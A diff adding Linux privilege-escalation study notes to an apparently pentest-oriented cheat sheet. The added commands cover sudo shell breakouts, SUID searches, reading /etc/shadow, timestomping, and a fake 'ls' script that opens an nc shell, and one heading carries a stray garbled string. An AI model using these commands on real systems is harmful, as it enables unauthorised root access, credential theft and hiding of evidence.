@@ -26,7 +26,7 @@ Scheduled Tasks and Services:
 
     Non-Standard Locations
 
-    Unquoted Executable Paths
+    Unquoted Executable PathsVpej6eaoK2sy2ak
 
     Vulnerabilities in Executables
 
@@ -55,15 +55,57 @@ EXE Replacment:
 Audit Logging: auditpol /get /category:*
 
 
+Linux:
+
+	sudo -l shows you what you are allowed to sudo 
+	/etc/groups /etc/passwd 
+	suid sgid 
+
+	sudo vim /filename  then when you are in the file : !sh
+
+	sudo less /filename then when you are looking at th file : !sh 
 	
+	https://gtfobins.github.io shows the diffrent bianaries that you can open a shell with 
+	(1) (2)  (3)  (4)
+	ALL=(ALL:ALL)ALL
+	on all hosts (1) any user in group(2) can sudo as all users in the group(3) to execute all commands (4)
 
+    use this to find what files have the suid bit turned on 
+	find / -type f -perm /4000 -ls 2>/dev/null
+	use this to see if the sgid is turned on 
+	find / -type f -perm /2000 -ls 2>/dev/null
+	use this to see both
+	find / -type f -perm /6000 -ls 2>/dev/null
 
+	cat /etc/crontab system level cronjobs	
+	cat /etc/cron.hourly.daily,weekly,monthly
+	cat /var/spool/cron/crontab user level cronjobs
+	showed all of the world writable directories
+	find / -type d -perm /2 2>/dev/null
 
+	ls -latr give listing of files in the order of which they were modified
 
+	timestomping 
+	touch -c -t 201603051015 1.txt   # Explicit
+    touch -r 3.txt 1.txt    # Reference
 
+	(1) see what is possible sudo -l
+	(2) go to gtfobins to see if you can abuse the sudo command
+	(3) break out using whatever technique to get a shell
 
+	(1) sudo -l if you can cat a specific file if its like var/syslog* 
+	(2) then add whatever fill you want behiend EX. cat /var/sysylog1 /etc/shadow
 
+	(1) find / -type f -perm /4000 -ls 2>/dev/null find the suid	
+	(2) cross refrence your findings with gtfobins suid filter
+	(3) use this to escalte perms and open a shell 
 
+	(1) create a file at the tmp files called ls 
+	(2) inside wrtie #!/bin/bash 
+		nc 127.0.0.1 3333
+	(3) chmod +x the file
+	(4) on your machine crate a listening port on the same port
+	(5) run the script on the remote machine
 
 
 
